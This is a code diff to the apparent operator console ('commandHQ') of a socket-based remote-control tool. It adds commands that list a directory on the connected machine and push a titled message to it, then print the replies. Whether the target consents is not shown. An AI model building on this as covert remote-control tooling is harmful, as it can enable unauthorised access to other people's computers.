@@ -74,14 +74,30 @@ def commandHQ():
 
         command = input(format)
 
+        ans = False # Update github repo
+
         if command == "1":
             try:
                 dir_path = input(format + "Enter directory: ")
-                message = str(["sfisd", dir_path])
+                message = str(["vfisd", dir_path])
                 message = message.encode()
                 conn.send(message)
+                ans = True
             except:
                 reload()
+
+        if command == "2":
+            try:
+                title = input(format + "Enter title: ")
+                message = input(format + "Enter message: ")
+                message = str(["smbwm", message, title])
+                message = message.encode()
+                conn.send(message)
+                ans = True
+            except:
+                reload()
+
+        if(ans == False): commandHQ()
 
         if(conn.recv):
 
@@ -89,7 +105,10 @@ def commandHQ():
             incoming_message = incoming_message.decode()
             incoming_message = ast.literal_eval(incoming_message)
 
-            if(incoming_message[0] == "sfisd"): # 1
+            if(incoming_message[0] == "vfisd"): # 1
+                print(format + "Data received: {}".format(incoming_message[1]))
+
+            if(incoming_message[0] == "smbwm"): # 2
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
